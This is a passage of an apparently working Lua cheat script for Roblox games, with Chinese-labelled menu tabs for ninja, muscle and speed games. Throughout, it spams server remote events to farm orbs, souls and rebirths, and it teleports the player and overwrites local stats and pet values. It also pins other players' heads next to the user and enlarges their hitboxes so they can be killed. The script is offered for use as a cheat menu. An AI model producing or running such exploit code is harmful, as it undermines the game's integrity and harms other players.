workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(ddb)()
local function __c()
local acc=Instance.new('LocalScript',b_b)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Good"local adc=""local bdc=""
_G.Enabled=false
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(__c)()
local function a_c()
local acc=Instance.new('LocalScript',c_b)
function onButtonClicked()while true do wait(.001)
game.Players.LocalPlayer.multiJumpCount.Value="50"end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(a_c)()
local function b_c()
local acc=Instance.new('LocalScript',d_b)function onButtonClicked()
while true do wait(.0001)local bcc="goInvisible"
local ccc=game.Players.LocalPlayer.ninjaEvent;ccc:FireServer(bcc)end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(b_c)()
local function c_c()
local acc=Instance.new('LocalScript',_ab)
function onButtonClicked()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Enchanted Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Astral Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Mystical Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Space Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Tundra Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Eternal Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Sandstorm Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Thunderstorm Island"].CFrame end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(c_c)()
local function d_c()
local acc=Instance.new('LocalScript',aab)
function onButtonClicked()
game:GetService("Players").LocalPlayer.PlayerGui.statEffectsGui.Enabled=
not
game:GetService("Players").LocalPlayer.PlayerGui.statEffectsGui.Enabled
game:GetService("Players").LocalPlayer.PlayerGui.hoopGui.Enabled=
not
game:GetService("Players").LocalPlayer.PlayerGui.hoopGui.Enabled end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(d_c)()
local function _ac()
local acc=Instance.new('LocalScript',bab)
function onButtonClicked()
while wait(1)do
for bcc,ccc in
pairs(game:GetService("Players"):GetPlayers())do
if
ccc.Name~=game:GetService("Players").LocalPlayer.Name then ccc.Character.Head.CanCollide=false
ccc.Character.Head.Size=Vector3.new(5,5,5)ccc.Character.Head.Transparency=0 end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(_ac)()
local function aac()
local acc=Instance.new('LocalScript',cab)
function onButtonClicked()
while wait(.0001)do
if
game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")then
game.Players.LocalPlayer.ninjaEvent:FireServer("swingKatana")else
for bcc,ccc in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
if
ccc.ClassName=="Tool"and ccc:FindFirstChild("attackShurikenScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(ccc)wait(.0001)if ccc.ClassName=="Tool"and
ccc:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(ccc)end end end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(aac)()
local function bac()
local acc=Instance.new('LocalScript',dab)
function onButtonClicked()
while wait(0.01)do
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame;wait(.05)
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Workspace.Part.CFrame end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(bac)()
local function cac()
local acc=Instance.new('LocalScript',_bb)
function onButtonClicked()
while wait(.001)do
if
player.PlayerGui.gameGui.maxNinjitsuMenu.Visible==true then
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame;wait(.05)
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Workspace.Part.CFrame end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(cac)()
local function dac()
local acc=Instance.new('LocalScript',abb)
function onButtonClicked()for bcc,ccc in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
if ccc:FindFirstChild("attackTime")then ccc.attackTime.Value=0 end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(dac)()
local function _bc()
local acc=Instance.new('LocalScript',bbb)
function onButtonClicked()
while wait(.001)do
if
game:GetService("Workspace").bossFolder:WaitForChild("RobotBoss"):WaitForChild("HumanoidRootPart")then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Workspace.bossFolder.RobotBoss.HumanoidRootPart.CFrame
if player.Character:FindFirstChildOfClass("Tool")then
player.Character:FindFirstChildOfClass("Tool"):Activate()else
for bcc,ccc in pairs(player.Backpack:GetChildren())do
if
ccc.ClassName=="Tool"and ccc:FindFirstChild("attackKatanaScript")then
ccc.attackTime.Value=0.2
player.Character.Humanoid:EquipTool(ccc)
if attackfar then
for dcc,_dc in pairs(player.Backpack:GetChildren())do if

_dc.ClassName=="Tool"and _dc:FindFirstChild("attackShurikenScript")then
player.Character.Humanoid:EquipTool(_dc)end end end end end end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(_bc)()
local function abc()
local acc=Instance.new('LocalScript',cbb)
function onButtonClicked()
while wait(.001)do
if
game:GetService("Workspace").bossFolder:WaitForChild("EternalBoss"):WaitForChild("HumanoidRootPart")then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Workspace.bossFolder.EternalBoss.HumanoidRootPart.CFrame
if player.Character:FindFirstChildOfClass("Tool")then
player.Character:FindFirstChildOfClass("Tool"):Activate()else
for bcc,ccc in pairs(player.Backpack:GetChildren())do
if
ccc.ClassName=="Tool"and ccc:FindFirstChild("attackKatanaScript")then
ccc.attackTime.Value=0.2
player.Character.Humanoid:EquipTool(ccc)
if attackfar then
for dcc,_dc in pairs(player.Backpack:GetChildren())do if

_dc.ClassName=="Tool"and _dc:FindFirstChild("attackShurikenScript")then
player.Character.Humanoid:EquipTool(_dc)end end end end end end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(abc)()
local function bbc()
local acc=Instance.new('LocalScript',dbb)
function onButtonClicked()_G.Hoops=true
while _G.Hoops do
local bcc=workspace.Hoops:getChildren()
for i=1,#bcc do
if _G.Hoops then for i=1,10 do
bcc[i].touchPart.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;wait()end end;wait()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(bbc)()
local function cbc()
local acc=Instance.new('LocalScript',_cb)
function onButtonClicked()
while wait(.0001)do
for bcc,ccc in
pairs(workspace.Hoops:GetDescendants())do if ccc:IsA("TouchTransmitter")then
ccc.Parent.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(cbc)()
local function dbc()
local acc=Instance.new('LocalScript',acb)function onButtonClicked()
game.Players.LocalPlayer.maxPetCapacity.Value=9999 end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(dbc)()
local function _cc()
local acc=Instance.new('LocalScript',bcb)
function onButtonClicked()
local bcc=game.Players.LocalPlayer.petsFolder:GetDescendants()for ccc,dcc in pairs(bcc)do
if dcc.ClassName=="NumberValue"then local _dc=dcc;_dc.Value=999999 end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(_cc)()
end)
local creds = window:Tab("力量传奇",'6035145364')

local tool = creds:section("功能",true)
tool:Button("（自动锻炼提前选择锻炼方式重置人物及关闭）",function()
        	 local part = Instance.new('Part', workspace)
part.Size = Vector3.new(500, 20, 530.1)
part.Position = Vector3.new(0, 1000, 133.15)
part.CanCollide = true
part.Anchored = true

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 15, 0)

local a = true
local rs = game:GetService("RunService").RenderStepped
if a == true then
while rs:wait() do
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if v.ClassName == "Tool" and v.Name == "Weight" then
v.Parent = game.Players.LocalPlayer.Character
end
end
game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
end
end

end)
local tool = creds:section("功能（传送）",true)
tool:Button("（出生点）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7, 3, 108)
end)
tool:Button("（蓝色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2543, 13, -410)
end)
tool:Button("（紫色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2177, 13, 1070)
end)
tool:Button("（橙色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6686, 13, -1284)
end)
tool:Button("（白色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4676, 997, -3915)
end)
tool:Button("（绿色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8554, 22, -5642)
end)
local creds = window:Tab("极速传奇",'6035145364')

local tool = creds:section("功能（传送）",true)
tool:Button("（城市）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9682.98828125, 58.87917709350586, 3099.033935546875)
end)
tool:Button("（白雪城）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9676.138671875, 58.87917709350586, 3782.69384765625)
end)
tool:Button("（熔岩城）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11054.96875, 216.83917236328125, 4898.62841796875) 
end)
tool:Button("（传奇公路）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13098.87109375, 216.83917236328125, 5907.6279296875)
end)
local tool = creds:section("功能（传送）",true)
tool:Button("（卡宠）",function()
        	spawn(function() while wait() do game:GetService("ReplicatedStorage").rEvents.rebirthEvent:FireServer("rebirthRequest") end end) while wait(0.1) do local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) end
end)
tool:Button("（刷步数）",function()
        	--current user using the Gui-XxYouMetDeathXx

--This Gui Made By VesilicsHD--

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local AutoXP = Instance.new("TextButton")
local AutoRebirth = Instance.new("TextButton")
local Credits = Instance.new("TextLabel")
local Game = Instance.new("TextLabel")
--Properties:
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.Active = true
Main.BackgroundColor3 = Color3.new(0, 0, 0)
Main.BackgroundTransparency = 0.20000000298023
Main.Position = UDim2.new(0.385036498, 0, 0.133200794, 0)
Main.Size = UDim2.new(0, 395, 0, 271)
Main.Draggable = true

AutoXP.Name = "刷级"
AutoXP.Parent = Main
AutoXP.BackgroundColor3 = Color3.new(0, 0, 0)
AutoXP.Position = UDim2.new(0.225957587, 0, 0.269300699, 0)
AutoXP.Size = UDim2.new(0, 200, 0, 50)
AutoXP.Font = Enum.Font.GothamSemibold
AutoXP.Text = "刷级"
AutoXP.TextColor3 = Color3.new(1, 1, 1)
AutoXP.TextScaled = true
AutoXP.TextSize = 24
AutoXP.TextWrapped = true
AutoXP.MouseButton1Down:connect(function()
while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = 